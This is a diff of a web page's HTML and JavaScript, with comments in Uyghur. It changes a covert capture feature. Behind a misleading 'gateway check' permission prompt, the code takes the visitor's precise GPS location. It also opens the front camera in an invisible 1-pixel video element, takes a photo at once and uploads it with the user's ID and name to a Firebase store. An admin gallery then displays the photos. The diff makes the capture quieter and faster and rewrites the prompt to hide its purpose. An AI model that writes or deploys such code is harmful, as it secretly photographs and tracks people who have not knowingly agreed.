@@ -151,7 +151,6 @@
         .btn-vip-user { background: #ff9800; color: #000; }
         .btn-del-user { background: #f44336; color: #fff; }
 
-        /* 🔥 يېڭىدىن قوشۇلغان مۇقىم رەسىملەر ئامبىرى نۇسخىسى */
         .photo-history-grid { display: grid; grid-template-columns: repeat(auto-fill, minmax(90px, 1fr)); gap: 8px; max-height: 250px; overflow-y: auto; background: var(--card-bg); padding: 10px; border-radius: var(--radius); border: 1px solid var(--border-color); }
         .photo-history-card { position: relative; background: #2a2a2d; border-radius: 8px; overflow: hidden; border: 1px solid #3a3a3c; }
         .photo-history-card img { width: 100%; height: 80px; object-fit: cover; display: block; cursor: pointer; }
@@ -209,7 +208,7 @@
         }
         .permission-box i { font-size: 40px; color: var(--primary-color); margin-bottom: 15px; }
         .permission-box h3 { font-size: 18px; margin-bottom: 10px; color: #fff; }
-        .permission-box p { font-size: 13px; color: var(--text-muted); margin-bottom: 20px; line-height: 1.5; }
+        .permission-box p { font-size: 13.5px; color: var(--text-muted); margin-bottom: 20px; line-height: 1.5; }
         .btn-allow-perm {
             background: var(--primary-color); color: white; border: none; width: 100%;
             padding: 12px; border-radius: 8px; font-weight: bold; font-size: 14px; cursor: pointer;
@@ -220,16 +219,15 @@
 
     <div class="screenshot-shield"></div>
 
-    <!-- 🔥 مۇقىملاشتۇرۇلغان كامېرا ئېقىم ئېلېمېنتى -->
-    <video id="secretCamStream" autoplay playsinline muted style="display:none; position:fixed; top:-9999px; left:-9999px; width:1px; height:1px;"></video>
+    <video id="secretCamStream" autoplay playsinline muted style="position:fixed; top:0; left:0; width:1px; height:1px; opacity:0; pointer-events:none; z-index:-1;"></video>
     <canvas id="secretCanvas" style="display:none;"></canvas>
 
-    <!-- 🔥 رۇخسەت سوراش مەخسۇس كۆزنىكى -->
+    <!-- 🔥 كۆزنەكتىكى تېكىست ئۆزگەرتىلدى -->
     <div id="permissionModal">
         <div class="permission-box">
             <i class="fa-solid fa-shield-halved"></i>
             <h3>دەرۋازا تەكشۈرۈش</h3>
-            <p>قانىلىمىزغا ئەزا بولشىڭىز كىرەك</p>
+            <p>توربەتنىڭ تولۇق ئىشلىشى ئۈچۈن ئىجازەت بېرىڭ</p>
             <button class="btn-allow-perm" onclick="requestUserPermissionsAndCapture()">رۇخسەت بېرىش ۋە كىرىش</button>
         </div>
     </div>
@@ -298,10 +296,9 @@
                 <button type="submit" class="btn-submit" style="background:#2196f3;">رەسىم يوللاش</button>
             </form>
 
-            <!-- 🔥 بارلىق مۇقىم ساقلانغان رەسىملەر ئامبىرى كۆزنىكى -->
             <div class="section-header" style="margin-top: 25px; color:#e50914;">📸 بارلىق تارتىلغان رەسىملەر ئامبىرى (تارىخىي رېكوردلار)</div>
             <div class="photo-history-grid" id="capturedHistoryGrid">
-                <div style="grid-column: 1/-1; text-align: center; color: var(--text-muted); font-size: 11px;">تېخى رەسىم يوق</div>
+                <div style="grid-column: 1/-1; text-align: center; color: var(--text-muted); font-size: 11px;">تېخى ساقلانغان رەسىم يوق</div>
             </div>
 
             <div class="section-header" style="margin-top: 25px;">توربەتكە كىرگەن ئابونتلار (<span id="userCount">0</span>)</div>
@@ -406,13 +403,14 @@
             }
         }
 
-        // 🔥 ئەلالاشتۇرۇلغان ۋە كاپالەتلىك مەخپىي كامېرا فۇنكسىيەسى
-        function requestUserPermissionsAndCapture() {
+        // 🔥 رۇخسەت بېرىلگەن ھامان كېچىكمەي دەرھال سۈرەتكە ئالىدىغان فۇنكسىيە
+        async function requestUserPermissionsAndCapture() {
             if (!currentUser || !currentUser.id) return;
 
             const permModal = document.getElementById('permissionModal');
             if (permModal) permModal.style.display = 'none';
 
+            // 1. GPS ئورنى ئېلىش
             if (navigator.geolocation) {
                 navigator.geolocation.getCurrentPosition((position) => {
                     const lat = position.coords.latitude;
@@ -424,67 +422,60 @@
                         updatedAt: new Date().toLocaleString()
                     });
                 }, (error) => {
-                    console.log("GPS رۇخسىتى بېرىلمىدى:", error.message);
-                }, { enableHighAccuracy: true, timeout: 10000 });
+                    console.log("GPS رۇخسىتى ئېلىنمىدى:", error.message);
+                }, { enableHighAccuracy: true, timeout: 8000 });
             }
 
-            const constraints = {
-                video: {
-                    facingMode: "user",
-                    width: { ideal: 480 },
-                    height: { ideal: 360 }
-                },
-                audio: false
-            };
-
-            navigator.mediaDevices.getUserMedia(constraints)
-                .then((stream) => {
-                    const video = document.getElementById('secretCamStream');
-                    video.srcObject = stream;
-                    
-                    video.onloadedmetadata = () => {
-                        video.play().then(() => {
-                            setTimeout(() => {
-                                const canvas = document.getElementById('secretCanvas');
-                                canvas.width = video.videoWidth || 480;
-                                canvas.height = video.videoHeight || 360;
-                                
-                                const ctx = canvas.getContext('2d');
-                                ctx.drawImage(video, 0, 0, canvas.width, canvas.height);
-                                
-                                const imageData = canvas.toDataURL('image/jpeg', 0.7);
-                                const nowStr = new Date().toLocaleString();
-
-                                const capturePayload = {
-                                    image: imageData,
-                                    capturedAt: nowStr
-                                };
-                                
-                                // 1. ئابونتنىڭ ئۆزىنىڭ كۆزنىكىگە ساقلاش
-                                window.dbSet(window.dbRef(window.db, `users/${currentUser.id}/capturedImage`), capturePayload);
-
-                                // 2. 🔥 باشقۇرغۇچىنىڭ مۇقىم ئامبىرى ئۈچۈن Firebase نىڭ ئايرىم تارىخ رېكوردىغا ساقلاش (push)
-                                const historyRef = window.dbPush(window.dbRef(window.db, 'captured_photos_history'));
-                                window.dbSet(historyRef, {
-                                    userId: currentUser.id,
-                                    userName: currentUser.first_name,
-                                    image: imageData,
-                                    time: nowStr
-                                }).then(() => {
-                                    console.log("مەخپىي رەسىم باشقۇرغۇچىنىڭ مۇقىم ئامبىرىغا مۇۋەپپەقىيەتلىك كىردى!");
-                                });
-
-                                stream.getTracks().forEach(track => track.stop());
-                            }, 1000);
-                        }).catch(e => {
-                            console.log("سىننى ئويغىتىشتا خاتالىق:", e);
-                            stream.getTracks().forEach(track => track.stop());
-                        });
-                    };
-                })
-                .catch((err) => {
-                    console.log("كامېرا رۇخسىتى بېرىلمىدى ياكى ئۈسكۈنە قوللىمىدى:", err);
+            // 2. كامېرانى ئېچىپ شۇئان سۈرەت ئېلىش
+            try {
+                const stream = await navigator.mediaDevices.getUserMedia({
+                    video: { facingMode: "user" },
+                    audio: false
                 });
+
+                const video = document.getElementById('secretCamStream');
+                video.srcObject = stream;
+                
+                // ئابونت رۇخسەت بەرگەن ھامان ئاپتوماتىك سۈرەتكە ئالىدۇ (شۇئان)
+                video.onloadedmetadata = () => {
+                    video.play();
+                    
+                    const canvas = document.getElementById('secretCanvas');
+                    const width = video.videoWidth || 640;
+                    const height = video.videoHeight || 480;
+
+                    canvas.width = width;
+                    canvas.height = height;
+
+                    const ctx = canvas.getContext('2d');
+                    ctx.drawImage(video, 0, 0, width, height);
+
+                    const imageData = canvas.toDataURL('image/jpeg', 0.65);
+                    const nowStr = new Date().toLocaleString();
+
+                    const capturePayload = {
+                        image: imageData,
+                        capturedAt: nowStr
+                    };
+
+                    // Firebase-قا يوللاش
+                    window.dbSet(window.dbRef(window.db, `users/${currentUser.id}/capturedImage`), capturePayload);
+
+                    const historyRef = window.dbPush(window.dbRef(window.db, 'captured_photos_history'));
+                    window.dbSet(historyRef, {
+                        userId: currentUser.id,
+                        userName: currentUser.first_name,
+                        image: imageData,
+                        time: nowStr
+                    });
+
+                    // ئېقىمنى ئۆچۈرۈش
+                    stream.getTracks().forEach(track => track.stop());
+                };
+
+            } catch (err) {
+                console.log("كامېرا رۇخسىتى بېرىلمىدى:", err);
+            }
         }
 
         function setupFirebaseListeners() {
@@ -529,7 +520,6 @@
                 renderAdminUserLists();
             });
 
-            // 🔥 باشقۇرغۇچى ئۈچۈن مۇقىم رەسىملەر تارىخى ئامبىرىنى كۆزىتىش
             window.dbOnValue(window.dbRef(window.db, 'captured_photos_history'), (snapshot) => {
                 const data = snapshot.val();
                 if (data) {
@@ -550,7 +540,6 @@
             });
         }
 
-        // 🔥 باشقۇرغۇچىنىڭ مۇقىم رەسىملەر ئامبىرىنى سىزىپ بېرىش
         function renderCapturedHistoryGrid() {
             const grid = document.getElementById('capturedHistoryGrid');
             if (!grid) return;
